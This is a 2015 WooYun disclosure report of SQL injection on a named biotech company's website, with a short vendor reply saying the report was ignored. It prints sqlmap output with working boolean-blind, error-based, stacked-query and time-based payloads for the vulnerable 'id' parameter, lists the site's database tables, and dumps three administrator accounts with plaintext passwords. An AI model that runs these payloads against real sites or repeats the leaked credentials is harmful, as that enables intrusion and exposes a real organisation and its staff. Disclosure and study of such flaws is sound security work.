wybug_title: 中源协和主站sql注入一枚
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-06：	细节已通知厂商并且等待厂商处理中									2015-09-11：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 大晚上的，好累。 详细说明：  
http://www.vcanbio.com//Investor_ArticleDetail.aspx?id=8
参数id，估计这是个失误吧报错注入。厂商敢不敢大方点   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=12 AND 3348=3348    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=12 AND (SELECT 6005 FROM(SELECT COUNT(*),CONCAT(0x71627a7671,(SELECT (ELT(6005=6005,1))),0x7170706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: id=12;(SELECT * FROM (SELECT(SLEEP(5)))XTwe)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=12 AND (SELECT * FROM (SELECT(SLEEP(5)))ASuB)---[20:27:34] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL 5.0+-----------------------------+| $x                          || gsgzs                       || jos_search_reports_customer || jos_search_reports_para     || njbglist                    || qdnj                        || qnnj                        || qxnj                        || qznj                        || sqlmapfile                  || sqlmapoutput                || t_academic                  || t_admin                     || t_annals                    || t_announcement              || t_article                   || t_companyinfo               || t_content                   || t_dashiji                   || t_log                       || t_medianews                 || t_message                   || t_news                      || t_staff                     || t_users                     || t_weblink                   || t_xiazai                    |+-----------------------------+Database: vcanbio_zhongyuanxieheTable: t_admin[3 entries]+-------+-------------+| uname | UPassword   |+-------+-------------+| 超级管理员 | hezeshengwu || 管理员   | 123456      || 王震东   | wzd         |+-------+-------------+别的东西我可没动，换换密码吧，太弱了【哈欠】图像自行脑补   修复方案：  1   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-11 12:56 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
